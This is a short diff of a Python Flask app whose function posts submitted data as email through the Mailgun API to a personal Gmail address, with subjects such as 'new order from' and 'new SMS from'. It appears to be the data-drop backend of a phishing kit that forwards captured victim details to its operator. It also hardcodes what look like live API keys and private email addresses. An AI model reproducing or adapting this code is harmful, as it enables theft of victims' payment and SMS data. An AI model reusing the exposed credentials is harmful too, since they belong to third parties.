@@ -2,13 +2,13 @@ from flask import Flask,request
 from user_agents import parse
 from requests import post
 app = Flask(__name__)
-EMAIL_DOMAIN = "rsassurancegroup.com"
-EMAIL_API_KEY = "4375b722038e6c02a983b9dedaf324b5-7bce17e5-96b3b613"
+EMAIL_DOMAIN = "sandboxc3f4f005745247319f479d58657db583.mailgun.org"
+EMAIL_API_KEY = "48ee41f89894266e02d6e49c2a4cf2a0-e566273b-1b101fc1"
 GATE_LINK = "https://api.mailgun.net/v3/{}/messages".format(EMAIL_DOMAIN)
 From = "admin@"+EMAIL_DOMAIN
 subject_res = "new order from "
 subject_sms = "new SMS from "
-to = "gonhamadi16@gmail.com"
+to = "amine.yamani92@gmail.com"
 def sift(mnine, data, subj ,send_to):
     response = post(GATE_LINK, auth=('api', EMAIL_API_KEY), data={
             'html': data,
